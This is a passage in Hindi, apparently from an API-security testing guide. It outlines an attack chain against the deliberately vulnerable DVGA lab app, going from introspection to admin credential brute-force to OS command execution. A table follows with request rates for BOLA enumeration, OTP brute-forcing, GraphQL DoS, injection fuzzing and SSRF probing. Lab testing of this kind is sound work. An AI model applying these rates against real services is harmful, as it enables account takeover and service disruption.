3. **DVGA रिकॉन-से-एक्सप्लॉइट:** इंट्रोस्पेक्शन → systemDiagnostics खोजें → एडमिन क्रेडेंशियल ब्रूट-फ़ोर्स → OS कमांड निष्पादन

### रेट अनुशंसाएँ

| पैटर्न | अनुरोध/सेकंड | अवधि | नोट |
|---|---|---|---|
| बेसलाइन (प्रति ऐप) | 10-50 | 5 मिनट | सामान्य ट्रैफिक फिंगरप्रिंट स्थापित करें |
| BOLA गणना | 100-500 | 2 मिनट | अनुक्रमिक ID स्कैनिंग |
| OTP ब्रूट-फ़ोर्स | 1000+ | मिलने तक | अधिकतम 10,000 प्रयास (4-अंकीय) |
| GraphQL DoS | 10-50 | 30 सेकंड | प्रत्येक अनुरोध सर्वर-साइड पर महंगा है |
| इंजेक्शन फज़िंग | 50-200 | 5 मिनट | प्रति अनुरोध पेलोड बदलें |
| SSRF प्रोबिंग | 5-20 | 2 मिनट | धीमा; प्रत्येक सर्वर-साइड HTTP अनुरोध ट्रिगर करता है |
